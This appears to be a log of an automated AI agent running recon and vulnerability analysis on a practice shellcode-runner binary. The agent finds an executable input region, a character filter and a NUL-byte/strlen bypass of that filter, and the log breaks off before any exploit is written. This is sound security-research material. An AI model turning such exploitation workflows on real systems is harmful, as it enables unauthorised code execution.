13:49:00 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

13:49:00 --- S1 Recon ---
13:49:00 === recon (bug_id=-) ===
13:49:00 [recon] → 调用 GLM...
13:49:04 [recon] ← GLM(4.1s): 调工具[checksec, elf_info, identify_libc, list_strings, symbols]
13:49:04 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息：保护机制、ELF头、libc识别、字符串、符号表。
13:49:04 [recon]   → 工具 checksec({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:49:04 [recon]   → 工具 elf_info({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:49:04 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:49:04 [recon]   → 工具 list_strings({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "max_lines": 100})
13:49:04 [recon]   → 工具 symbols({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "max_lines": 80})
13:49:04 [recon]   ← symbols(0.0s): 00000000004af300 r CSWTCH.102 ⏎ 00000000004af300 r CSWTCH.103 ⏎ 00000000004c5130 V DW.ref.__gcc_personality_v0 ⏎ 00000000004b4c2c W _.stapsdt.base ⏎ 0...(3069 chars)
13:49:04 [recon]   ← identify_libc(0.0s): ===LIBC VERSION=== ⏎ 
13:49:04 [recon]   ← list_strings(0.0s): PTE1 ⏎ u+UH ⏎ AWAVAUATSH ⏎ AUATSASARAQAPWVM ⏎ [A\A]A^A_] ⏎ 5hc	 ⏎ uHdH ⏎ D$hdH ⏎ D$pH ⏎ D$ dH ⏎ ATUH ⏎ ]A\A]A^A_ ⏎ s>H9 ⏎ []A\ ⏎ AWAVA ⏎ AUATU ⏎ D9t$ ...(812 chars)
13:49:04 [recon]   ← elf_info(0.0s): /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, Bu...(3630 chars)
13:49:04 [recon]   ← checksec(0.2s): [*] '/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     St...(313 chars)
13:49:05 [recon] → 调用 GLM...
13:49:09 [recon] ← GLM(4.6s): 调工具[sections, global_vars, disassemble, cfg, probe_io]
13:49:09 [recon] 静态链接二进制（statically linked），No PIE，有 Canary/NX/CET。继续收集：sections、全局变量、main函数反汇编、CFG、probe_io。
13:49:09 [recon]   → 工具 sections({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:49:09 [recon]   → 工具 global_vars({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "max_lines": 60})
13:49:09 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 120})
13:49:09 [recon]   → 工具 cfg({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:49:09 [recon]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "steps": "[{\"recv_until\": \"\", \"send\": \"\"}]"})
13:49:09 [recon]   ← sections(0.0s): There are 32 section headers, starting at offset 0xdb5b8: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎...(4963 chars)
13:49:09 [recon]   ← global_vars(0.0s):      2: 00000000004002c4    32 OBJECT  LOCAL  DEFAULT    3 __abi_tag ⏎      4: 0000000000498650    19 OBJECT  LOCAL  DEFAULT   10 errstr.0 ⏎      7: 0...(4629 chars)
13:49:09 [recon]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(4319 chars)
13:49:09 [recon]   ← probe_io(0.2s): RECV_TAIL: b'\nInput your shellcode here (max: 100): '
13:50:00 [recon]   ← cfg(51.3s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(5367 chars)
13:50:00 [recon] → 调用 GLM...
13:50:06 [recon] ← GLM(5.8s): 调工具[disassemble, disassemble, disassemble, disassemble, probe_io]
13:50:06 [recon] 关键发现：静态链接、No PIE、main 中 mmap RWX 区域 (0x13370000, size 0x64=100)，read shellcode，检查 `is_all_upper`，然后跳转到 mmap 区域执行。继续看 main 后半部分、init、is_all_upper、_abor
13:50:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 80})
13:50:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "init", "lines": 60})
13:50:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "is_all_upper", "lines": 80})
13:50:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "_abort", "lines": 40})
13:50:06 [recon]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "input": "AAAA"})
13:50:06 [recon]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
13:50:06 [recon]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(2796 chars)
13:50:06 [recon]   ← disassemble(0.1s): 0000000000401775 <_abort>: ⏎   401775:	endbr64 ⏎   401779:	push   rbp ⏎   40177a:	mov    rbp,rsp ⏎   40177d:	sub    rsp,0x10 ⏎   401781:	mov    QWORD ...(470 chars)
13:50:06 [recon]   ← disassemble(0.1s): 00000000004017aa <init>: ⏎   4017aa:	endbr64 ⏎   4017ae:	push   rbp ⏎   4017af:	mov    rbp,rsp ⏎   4017b2:	mov    rax,QWORD PTR [rip+0xc3f3f]        #...(876 chars)
13:50:06 [recon]   ← disassemble(0.1s): 0000000000401819 <is_all_upper>: ⏎   401819:	endbr64 ⏎   40181d:	push   rbp ⏎   40181e:	mov    rbp,rsp ⏎   401821:	push   rbx ⏎   401822:	sub    rsp,0...(2036 chars)
13:50:06 [recon] → 调用 GLM...
13:50:11 [recon] ← GLM(4.4s): 调工具[disassemble, got_plt, list_strings, symbols]
13:50:11 [recon] 非常清晰。main 在 is_all_upper 通过后，把所有寄存器保存到栈上，然后跳转到 mmap 区域执行 shellcode。需要看 main 后半部分（跳转执行部分）和 GOT/PLT。继续收集。
13:50:11 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 60})
13:50:11 [recon]   → 工具 got_plt({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:50:11 [recon]   → 工具 list_strings({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "shellcode", "max_lines": 30})
13:50:11 [recon]   → 工具 symbols({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "mmap", "max_lines": 20})
13:50:11 [recon]   ← got_plt(0.0s): []
13:50:11 [recon]   ← symbols(0.0s): 0000000000415280 T _IO_file_close_mmap ⏎ 00000000004c6e20 D _IO_file_jumps_maybe_mmap ⏎ 00000000004c6ee0 D _IO_file_jumps_mmap ⏎ 0000000000414e60 t _I...(874 chars)
13:50:11 [recon]   ← list_strings(0.0s): Input your shellcode here (max: 100):  ⏎ invalid shellcode! ⏎ Before running the shellcode: ⏎ shellcode_runner2.c ⏎ 
13:50:11 [recon]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(2094 chars)
13:50:11 [recon] → 调用 GLM...
13:50:16 [recon] ← GLM(5.3s): 调工具[execute, execute]
13:50:16 [recon] 反汇编工具对 main 的 lines 参数似乎从开头重复显示。我需要看 main 在 0x401ad6 之后的部分（跳转执行 shellcode）。用 execute 跑 objdump 看完整 main，并查 rodata 中的字符串。
13:50:16 [recon]   → 工具 execute({"command": "objdump -d -M intel --no-show-raw-insn /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target | sed -n '/<main>:/,/<.*>:/p)
13:50:16 [recon]   → 工具 execute({"command": "objdump -s -j .rodata /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target | head -40"})
13:50:16 [recon]   ← execute(0.0s):  ⏎ /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target:     file format elf64-x86-64 ⏎  ⏎ Contents of section .rodata: ⏎  498000 010...(2482 chars)
13:50:16 [recon]   ← execute(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(5913 chars)
13:50:16 [recon] → 调用 GLM...
13:50:22 [recon] ← GLM(6.2s): 调工具[disassemble, symbols, execute, execute]
13:50:22 [recon] 完整 main 已获取。关键点：`call rax` (0x401b4b) 跳转到 mmap 的 RWX 区域执行用户 shellcode。还发现 `handle_zhaoxin` 函数。继续看这个函数和其他相关函数，以及确认是否有 seccomp。
13:50:22 [recon]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "handle_zhaoxin", "lines": 60})
13:50:22 [recon]   → 工具 symbols({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "handle", "max_lines": 20})
13:50:22 [recon]   → 工具 execute({"command": "objdump -d -M intel --no-show-raw-insn /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target | grep -E '<(handle_|seccomp)
13:50:22 [recon]   → 工具 execute({"command": "readelf -d /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target 2>/dev/null; echo \"---NEEDED---\"; readelf -d /work/wor)
13:50:22 [recon]   ← symbols(0.0s): 00000000004c50e8 D __dso_handle ⏎ 000000000046b2b0 T __handle_registered_modifier_mb ⏎ 000000000046b380 T __handle_registered_modifier_wc ⏎ 0000000000...(340 chars)
13:50:22 [recon]   ← execute(0.0s):  ⏎ There is no dynamic section in this file. ⏎ ---NEEDED--- ⏎ ---RPATH--- ⏎  ⏎ Exit code: 1 ⏎ [Command failed with exit code 1]
13:50:22 [recon]   ← execute(0.1s): 0000000000401b80 <handle_zhaoxin>: ⏎   401b8f:	je     401c77 <handle_zhaoxin+0xf7> ⏎   401bad:	jbe    401cca <handle_zhaoxin+0x14a> ⏎   401bb6:	jbe   ...(1479 chars)
13:50:22 [recon]   ← disassemble(0.1s): 0000000000401b80 <handle_zhaoxin>: ⏎   401b80:	push   rbx ⏎   401b81:	mov    eax,0x4 ⏎   401b86:	xor    ecx,ecx ⏎   401b88:	cpuid ⏎   401b8a:	mov    e...(1940 chars)
13:50:22 [recon] → 调用 GLM...
13:50:32 [recon] ← GLM(9.2s): 调工具[execute, run_binary]
13:50:32 [recon] `handle_zhaoxin`/`handle_amd`/`handle_intel` 是 glibc 的 CPUID 处理函数（静态链接 libc 自带），与漏洞无关。无动态段（静态链接），无 NEEDED/RPATH。无 seccomp/prctl 调用。现在确认 is_all_upper 的
13:50:32 [recon]   → 工具 execute({"command": "python3 -c \"\n# glibc ctype bit masks\n# _ISupper = 0x100, _ISalpha = 0x800 (which includes upper+lower)\n# is_all_upper checks: if isup)
13:50:32 [recon]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin": "AAAA", "timeout": 8})
13:50:32 [recon]   ← run_binary(0.0s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
13:50:32 [recon]   ← execute(0.0s): _ISupper = 0x100 ⏎ _ISalpha = 0x800 (matches upper AND lower) ⏎ is_all_upper allows: uppercase, lowercase (via isalpha), and space ⏎ So the filter is ...(242 chars)
13:50:32 [recon] → 调用 GLM...
13:50:35 [recon] ← GLM(3.7s): 调工具[run_binary, run_binary]
13:50:35 [recon] 确认：`AAAA`（大写字母）通过 is_all_upper 检查，shellcode 被执行（SIGSEGV 因为 AAAA 不是有效指令）。寄存器状态被打印。现在验证小写字母是否也通过，以及数字/特殊字符是否被拒绝。
13:50:35 [recon]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin": "aaaa", "timeout": 8})
13:50:35 [recon]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin": "1234", "timeout": 8})
13:50:35 [recon]   ← run_binary(0.0s): rc=1  stdout_len=58 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010 ...(364 chars)
13:50:36 [recon]   ← run_binary(0.3s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
13:50:36 [recon] → 调用 GLM...
13:50:49 [recon] ← GLM(13.7s): 调工具[execute]
13:50:49 [recon] 重要发现修正：`aaaa`（小写）被拒绝（"invalid shellcode!"），`1234`（数字）反而通过了！让我重新审视 is_all_upper 的逻辑。数字 '1'-'9' 的 ctype 值需要确认。实际上 `0x800` 是 `_ISalpha`，数字不是 alpha。但 `123
13:50:49 [recon]   → 工具 execute({"command": "python3 -c \"\n# Re-examine: the disasm shows two checks with ctype_b_loc:\n# Check 1: and eax, 0x100  (isupper bit) -> if set, continue )
13:50:49 [recon]   ← execute(0.0s): _ISupper = 0x100 ⏎ _ISlower = 0x200 ⏎ _ISalpha = 0x400 ⏎ _ISdigit = 0x800  <-- THIS is what the code checks! ⏎ _ISspace = 0x2000 ⏎  ⏎ So is_all_upper ...(349 chars)
13:50:49 [recon] → 调用 GLM...
13:50:59 [recon] ← GLM(9.4s): 调工具[execute, elf_plt_got]
13:50:59 [recon] 关键修正：`0x800` 是 `_ISdigit`，不是 `_ISalpha`。所以 is_all_upper 允许的字符集是：**大写字母 (A-Z)、数字 (0-9)、空格 (0x20)**。这大大扩展了可用 shellcode 字节范围。现在确认哪些字节值在这个范围内，并收集最后的 GOT/P
13:50:59 [recon]   → 工具 execute({"command": "python3 -c \"\n# Allowed bytes for shellcode:\n# - Uppercase letters: A-Z = 0x41-0x5a\n# - Digits: 0-9 = 0x30-0x39\n# - Space: 0x20\n# - )
13:50:59 [recon]   → 工具 elf_plt_got({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "symbols": "main,init,is_all_upper,_abort,__mmap64,__libc_read,_IO)
13:50:59 [recon]   ← execute(0.0s): Allowed byte values (hex): ⏎ 20 30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a ⏎  ⏎ Total...(428 chars)
13:50:59 [recon]   ← elf_plt_got(0.0s): {"plt": {}, "got": {}, "symbols": {"main": "0x4018dd", "init": "0x4017aa", "is_all_upper": "0x401819", "_abort": "0x401775", "__mmap64": "0x450380", "...(275 chars)
13:50:59 [recon] → 调用 GLM...
13:51:51 [recon] ← GLM(52.4s): 调工具[submit_final_result]
13:51:51 [recon] 所有关键信息已收集完毕。静态链接二进制没有动态 GOT/PLT（所有函数直接调用）。现在整理完整侦察报告并提交。
13:51:51 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，11387 chars）
13:51:51 [recon] → 调用 GLM...
13:51:58 [recon] ← GLM(7.1s)
13:51:58 [recon] S1 侦察完成。已提交完整的 ReconReport JSON。  核心发现摘要：  1. **二进制类型**：静态链接 ELF64 x86-64，No PIE (base 0x400000)，not stripped 2. **保护机制**：Partial RELRO、NX、Canary、No P
13:51:58 [stage1] 保存 → /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/stage1.json
13:51:58 --- S2 Semantic ---
13:51:58 === semantic (bug_id=-) ===
13:51:58 [semantic] → 调用 GLM...
13:52:02 [semantic] ← GLM(3.4s): 调工具[disassemble, disassemble]
13:52:02 [semantic] 我将分析这个二进制文件的语义级漏洞。让我先检查关键函数的反汇编代码，以验证 S1 的事实并追踪数据流。
13:52:02 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 200})
13:52:02 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "is_all_upper", "lines": 100})
13:52:02 [semantic]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(5837 chars)
13:52:02 [semantic]   ← disassemble(0.1s): 0000000000401819 <is_all_upper>: ⏎   401819:	endbr64 ⏎   40181d:	push   rbp ⏎   40181e:	mov    rbp,rsp ⏎   401821:	push   rbx ⏎   401822:	sub    rsp,0...(2036 chars)
13:52:02 [semantic] → 调用 GLM...
13:52:06 [semantic] ← GLM(4.2s): 调工具[disassemble, disassemble]
13:52:06 [semantic] 很好，反汇编结果证实了 S1 的事实。现在让我更仔细地检查关键区域。我需要验证： 1. `read` 返回值处理（负返回值检查） 2. `is_all_upper` 中 `strlen` 的使用（NUL 终止依赖） 3. `call rax` 间接调用以及 CET/IBT 的影响 4. 精确的过滤逻
13:52:06 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "_init", "lines": 50})
13:52:06 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "_abort", "lines": 30})
13:52:06 [semantic]   ← disassemble(0.1s): 0000000000401775 <_abort>: ⏎   401775:	endbr64 ⏎   401779:	push   rbp ⏎   40177a:	mov    rbp,rsp ⏎   40177d:	sub    rsp,0x10 ⏎   401781:	mov    QWORD ...(470 chars)
13:52:06 [semantic]   ← disassemble(0.1s): 0000000000401000 <_init>: ⏎   401000:	endbr64 ⏎   401004:	sub    rsp,0x8 ⏎   401008:	mov    rax,0x0 ⏎   40100f:	test   rax,rax ⏎   401012:	je     4010...(237 chars)
13:52:06 [semantic] → 调用 GLM...
13:52:09 [semantic] ← GLM(3.3s): 调工具[disassemble, list_strings]
13:52:10 [semantic] 现在让我更仔细地分析关键的数据流。我需要理解 `read` 返回值的检查以及 `is_all_upper` 如何使用 `strlen`。让我检查 `0x401180` 处的 `strlen` 调用，并验证 `read` 返回值处理逻辑。
13:52:10 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "lines": 30, "function": "__libc_read"})
13:52:10 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "shellcode", "max_lines": 30})
13:52:10 [semantic]   ← list_strings(0.0s): Input your shellcode here (max: 100):  ⏎ invalid shellcode! ⏎ Before running the shellcode: ⏎ shellcode_runner2.c ⏎ 
13:52:10 [semantic]   ← disassemble(0.1s): 000000000044f6d0 <__libc_read>: ⏎   44f6d0:	endbr64 ⏎   44f6d4:	mov    eax,DWORD PTR fs:0x18 ⏎   44f6dc:	test   eax,eax ⏎   44f6de:	jne    44f6f0 <__l...(1103 chars)
13:52:10 [semantic] → 调用 GLM...
13:52:19 [semantic] ← GLM(9.0s): 调工具[disassemble, disassemble]
13:52:19 [semantic] 现在让我更仔细地分析关键漏洞。让我看看 `read` 返回值是如何处理的，以及 `is_all_upper` 是如何使用 `strlen` 的。关键问题如下：  1. `read` 返回值检查：在 `0x4019b8` 处，它检查 `cmp DWORD PTR [rbp-0xac],0x0` 并使用
13:52:19 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "strlen", "lines": 30})
13:52:19 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "lines": 20, "function": "__mmap64"})
13:52:19 [semantic]   ← disassemble(0.1s): 0000000000450380 <__mmap64>: ⏎   450380:	endbr64 ⏎   450384:	mov    r10d,ecx ⏎   450387:	test   r9d,0xfff ⏎   45038e:	jne    4503a0 <__mmap64+0x20> ⏎ ...(649 chars)
13:52:19 [semantic]   ← disassemble(0.1s): <no output>
13:52:19 [semantic] → 调用 GLM...
13:52:21 [semantic] ← GLM(1.9s): 调工具[symbols]
13:52:21 [semantic] 现在让我找到 `strlen` 函数——它可能是一个内联函数或具有不同的符号名称。
13:52:21 [semantic]   → 工具 symbols({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "strlen", "max_lines": 20})
13:52:21 [semantic]   ← symbols(0.0s): 000000000043f0a0 T __strlen_avx2 ⏎ 00000000004499a0 T __strlen_avx2_rtm ⏎ 000000000044c440 T __strlen_evex ⏎ 000000000043ecd0 T __strlen_sse2 ⏎ 000000...(206 chars)
13:52:21 [semantic] → 调用 GLM...
13:52:23 [semantic] ← GLM(2.5s): 调工具[disassemble]
13:52:23 [semantic] 现在让我检查一下 `0x401180` 处的调用，以了解 `is_all_upper` 中调用了哪个 `strlen`。
13:52:23 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "lines": 30, "function": "strlen_ifunc"})
13:52:23 [semantic]   ← disassemble(0.1s): 00000000004223d0 <strlen_ifunc>: ⏎   4223d0:	endbr64 ⏎   4223d4:	mov    edx,DWORD PTR [rip+0xa9fee]        # 4cc3c8 <_dl_x86_cpu_features+0x48> ⏎   42...(1202 chars)
13:52:23 [semantic] → 调用 GLM...
13:52:32 [semantic] ← GLM(8.9s): 调工具[disassemble]
13:52:32 [semantic] 现在我已经清楚了。让我分析一下关键漏洞。让我更仔细地查看 `read` 返回值处理，并检查 `is_all_upper` 中 `strlen` 的使用情况。  关键分析点：  1. **`read` 返回值检查**：在 `0x4019b8` 处，`cmp DWORD PTR [rbp-0xac],0
13:52:32 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "__ctype_b_loc", "lines": 30})
13:52:32 [semantic]   ← disassemble(0.1s): 0000000000404820 <__ctype_b_loc>: ⏎   404820:	endbr64 ⏎   404824:	mov    rax,0xffffffffffffffd0 ⏎   40482b:	add    rax,QWORD PTR fs:0x0 ⏎   404834:	re...(208 chars)
13:52:32 [semantic] → 调用 GLM...
13:52:44 [semantic] ← GLM(12.1s): 调工具[disassemble]
13:52:44 [semantic] 现在让我仔细分析一下 `read` 返回值处理中关于负返回值的关键漏洞。让我重新检查一下具体的指令：  在 `0x4019b2` 处：`mov DWORD PTR [rbp-0xac], eax` —— 将 `read` 返回值存储为 32 位有符号整数 在 `0x4019b8` 处：`cmp DW
13:52:44 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "init", "lines": 50})
13:52:44 [semantic]   ← disassemble(0.1s): 00000000004017aa <init>: ⏎   4017aa:	endbr64 ⏎   4017ae:	push   rbp ⏎   4017af:	mov    rbp,rsp ⏎   4017b2:	mov    rax,QWORD PTR [rip+0xc3f3f]        #...(876 chars)
13:52:44 [semantic] → 调用 GLM...
13:53:05 [semantic] ← GLM(20.7s): 调工具[execute]
13:53:05 [semantic] 现在让我仔细分析一下 `read` 返回值处理漏洞。关键问题是 `read` 返回 -1（错误）是否会导致越界访问。让我更仔细地追踪数据流。  实际上，让我重新考虑一下。`read` 返回值检查只检查 `!= 0`，而不是 `> 0`。如果 `read` 返回 -1（错误），它会通过检查。然后代码执
13:53:05 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Allowed bytes: 0x20, 0x30-0x39, 0x41-0x5a\nallowed = set([0x20] + list(range(0x30, 0x3a)) + list(range(0x41, 0x5b)))\npr)
13:53:05 [semantic]   ← execute(0.0s): Allowed bytes (hex): 20 30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a ⏎ Count: 37 ⏎  ⏎ K...(600 chars)
13:53:05 [semantic] → 调用 GLM...
13:53:18 [semantic] ← GLM(13.3s): 调工具[execute]
13:53:18 [semantic] 这证实了核心漏洞。现在让我更仔细地分析 `read` 返回值处理，以确定是否存在额外的内存安全漏洞。
13:53:18 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Analyze the read return value handling in main\n# At 0x4019b2: mov DWORD PTR [rbp-0xac], eax  (store read return as int3)
13:53:18 [semantic]   ← execute(0.0s): read return value = -1 (error) path analysis: ⏎   buf[read_ret - 1] = buf[-2] = mmap_buf - 2 = 0x1336FFFE ⏎   This is an OOB READ before the mmap regi...(594 chars)
13:53:18 [semantic] → 调用 GLM...
13:53:40 [semantic] ← GLM(22.1s): 调工具[execute]
13:53:40 [semantic] 现在让我检查一下 `is_all_upper` 函数是否存在潜在问题——特别是 `strlen` 是否会受到 NUL 字节注入的影响。
13:53:40 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Analyze is_all_upper's strlen usage\n# \n# The buffer is memset to 0 (100 bytes) before read\n# read reads up to 99 byte)
13:53:40 [semantic]   ← execute(0.0s): NUL byte injection bypass analysis: ⏎  ⏎ is_all_upper uses strlen(buf) as loop bound ⏎ strlen stops at first NUL (0x00) byte ⏎ read() does NOT stop at...(840 chars)
13:53:40 [semantic] → 调用 GLM...
13:53:55 [semantic] ← GLM(14.2s): 调工具[execute]
13:53:55 [semantic] 这是一个关键发现。让我通过重新检查 `is_all_upper` 的确切循环结构来验证这一分析。  查看 `is_all_upper` 的反汇编代码： - `0x4018b7`：`mov eax, [rbp-0x14]` → eax = i (循环计数器) - `0x4018ba`：`movsxd 
13:53:55 [semantic]   → 工具 execute({"command": "python3 -c \"\n# CET/IBT analysis\n# S1 reports CET (IBT+SHSTK) enabled in ELF\n# IBT requires endbr64 at indirect call targets\n# The ca)
13:53:55 [semantic]   ← execute(0.0s): CET/IBT analysis: ⏎   IBT marked in ELF, but runtime enforcement uncertain ⏎   If enforced: call rax to non-endbr64 target faults (#CP) ⏎   If not enf...(523 chars)
13:53:55 [semantic] → 调用 GLM...
13:53:57 [semantic] ← GLM(2.5s): 调工具[execute]
13:53:57 [semantic] 现在让我检查一下该二进制文件是否具有用于 CET 的 GNU 属性节，这将告诉我们 IBT 是否被标记为二进制文件所必需。
13:53:57 [semantic]   → 工具 execute({"command": "readelf -n /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target 2>/dev/null | head -30"})
13:53:57 [semantic]   ← execute(0.0s):  ⏎ Displaying notes found in: .note.gnu.property ⏎   Owner                Data size 	Description ⏎   GNU                  0x00000020	NT_GNU_PROPERTY_T...(1362 chars)
13:53:57 [semantic] → 调用 GLM...
13:54:11 [semantic] ← GLM(13.8s): 调工具[execute]
13:54:11 [semantic] 该二进制文件具有 `IBT, SHSTK` GNU 属性。这意味着该二进制文件启用了 CET。然而，CET 的强制执行取决于内核和 CPU 的支持。S1 的运行时测试显示 `AAAA` 输入时出现 SIGSEGV，这可能是由于 IBT 故障或指令无效导致的。  现在让我汇总完整的分析。让我再验证一件
13:54:11 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Final verification of the NUL byte bypass\n# \n# is_all_upper loop structure (from disassembly):\n#   i = 0\n#   while ()
13:54:11 [semantic]   ← execute(0.0s): === VULNERABILITY SUMMARY === ⏎  ⏎ BUG-001: Shellcode filter bypass via NUL byte + strlen ⏎   Root Cause: is_all_upper uses strlen(buf) as loop bound ...(823 chars)
13:54:11 [semantic] → 调用 GLM...
13:54:23 [semantic] ← GLM(12.3s): 调工具[execute]
13:54:23 [semantic] 现在让我再验证一个重要的细节——`is_all_upper` 函数是否在每次循环迭代中调用 `strlen`（这会影响性能，但不影响漏洞），并确认 `read` 返回值存储为有符号 32 位整数。
13:54:23 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Verify: is_all_upper calls strlen on EVERY loop iteration\n# At 0x4018b7-0x4018cc:\n#   mov eax, [rbp-0x14]   ; eax = i\)
13:54:23 [semantic]   ← execute(0.0s): Confirmed: strlen called every iteration, returns offset to first NUL ⏎ Confirmed: read return stored as int32, sign-extended via cdqe ⏎ Confirmed: re...(243 chars)
13:54:23 [semantic] → 调用 GLM...
13:54:34 [semantic] ← GLM(11.0s): 调工具[execute]
13:54:34 [semantic] 现在我已经有了完整的分析。让我再检查一下是否还有其他我可能遗漏的安全检查，并验证关于 `read` 返回值检查的 S1 事实。
13:54:34 [semantic]   → 工具 execute({"command": "python3 -c \"\n# Check: does the newline replacement logic create any additional issues?\n# At 0x4019d0-0x4019fd:\n#   eax = read_ret (st)
